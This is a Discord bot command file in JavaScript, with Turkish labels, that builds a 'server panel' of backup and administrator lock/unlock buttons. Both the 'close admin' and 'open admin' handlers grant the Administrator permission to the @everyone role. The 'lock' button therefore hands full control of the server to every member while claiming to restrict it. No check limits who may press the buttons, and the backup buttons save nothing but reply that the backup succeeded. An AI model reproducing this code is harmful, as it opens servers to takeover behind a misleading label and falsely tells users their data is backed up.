const { ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField, MessageEmbed, EmbedBuilder } = require('discord.js');

     
    exports.run = async(client, message, args) => {
        const embed = new EmbedBuilder()
            .setTitle('Sunucu Panel Komutları')
            .setDescription(`Bu komut, sunucudaki çeşitli işlevleri gerçekleştirmek için kullanılan butonları içeren bir paneli sunar.

            <:2572verifiedbadge:1214232822727049267>  --- project @emdocs
            
            \`\`\`js
            - Developed by @EmdocsDev
             \`\`\``)
        const kanallariYedekleButton = new ButtonBuilder()
            .setCustomId("channelBackup")
            .setLabel("Kanalları Yedekle")
            .setEmoji('💛')
            .setStyle(ButtonStyle.Success);

        const rolleriYedekleButton = new ButtonBuilder()
            .setCustomId("roleBackup")
            .setLabel("Rolleri Yedekle")
            .setEmoji('💛')
            .setStyle(ButtonStyle.Success);

        const herseyiYedekleButton = new ButtonBuilder()
            .setCustomId("allBackup")
            .setLabel("Herşeyi Yedekle")
            .setEmoji('💛')
            .setStyle(ButtonStyle.Success);

        const ytLockButton = new ButtonBuilder()
            .setCustomId("ytLock")
            .setLabel("Yönetici Kapat")
            .setEmoji('💛')
            .setStyle(ButtonStyle.Success);

        const ytUnlockButton = new ButtonBuilder()
            .setCustomId("ytUnlock")
            .setLabel("Yönetici Aç")
            .setEmoji('💛')
            .setStyle(ButtonStyle.Success);

        const exitButton = new ButtonBuilder()
            .setCustomId("exit")
            .setLabel("İptal")
            .setEmoji('💛')
            .setStyle(ButtonStyle.Danger);

        const actionRow1 = new ActionRowBuilder().addComponents(
            kanallariYedekleButton,
            rolleriYedekleButton,
            herseyiYedekleButton
        );

        const actionRow2 = new ActionRowBuilder().addComponents(
            ytLockButton,
            ytUnlockButton,
            exitButton
        );

        message.channel.send({ embeds: [embed], components: [actionRow1, actionRow2] });


        const collector = message.channel.createMessageComponentCollector();

        collector.on('collect', async (interaction) => {
            if (interaction.customId === 'channelBackup') {
                // Kanalları yedekle ve bildir
                const channels = interaction.guild.channels.cache.filter(channel => channel.type !== 'category');
                const channelData = channels.map(channel => ({
                    name: channel.name,
                    type: channel.type,
                    permissionOverwrites: channel.permissionOverwrites,
                    parent: channel.parent ? channel.parent.name : null
                }));
                console.log(channelData); // Kanal verilerini konsola yazdır

                // Burada kanal verilerini bir dosyaya veya başka bir yere kaydedebilir ve bildirim gönderebilirsiniz.
                interaction.reply({ content: 'Kanallar başarıyla yedeklendi.', ephemeral: true });
            } else if (interaction.customId === 'roleBackup') {
                // Rolleri yedekle
                const roles = interaction.guild.roles.cache.map(role => role);
                console.log(roles); // Rolleri konsola yazdır

                // Burada rolleri bir dosyaya veya başka bir yere kaydedebilirsiniz.

                interaction.reply({ content: 'Roller başarıyla yedeklendi.', ephemeral: true });
            } else if (interaction.customId === 'allBackup') {
                // Herşeyi yedekle
                // Kanalları, rolleri, emojileri, vb. yedekleyin
                // Burada her şeyin yedeklenmesi için gerekli işlemleri yapabilirsiniz.

                interaction.reply({ content: 'Herşey başarıyla yedeklendi.', ephemeral: true });
            } else if (interaction.customId === 'ytLock') {
                // Yönetici Kapat
                const everyoneRole = interaction.guild.roles.everyone;
                const permissions = everyoneRole.permissions;
                permissions.add(PermissionsBitField.Flags.Administrator);
                everyoneRole.setPermissions(permissions);

                interaction.reply({ content: 'Yönetici yetkileri başarıyla kapatıldı.', ephemeral: true });
            } else if (interaction.customId === 'ytUnlock') {
                // Yönetici Aç
                const everyoneRole = interaction.guild.roles.everyone;
                const permissions = everyoneRole.permissions;
                permissions.add(PermissionsBitField.Flags.Administrator);
                everyoneRole.setPermissions(permissions);

                interaction.reply({ content: 'Yönetici yetkileri başarıyla açıldı.', ephemeral: true });
            }
        });
    },
    exports.conf = {
        aliases: ["panel","guardpanel"],
    
      };
      
      exports.help = {
        name: 'panel'
      };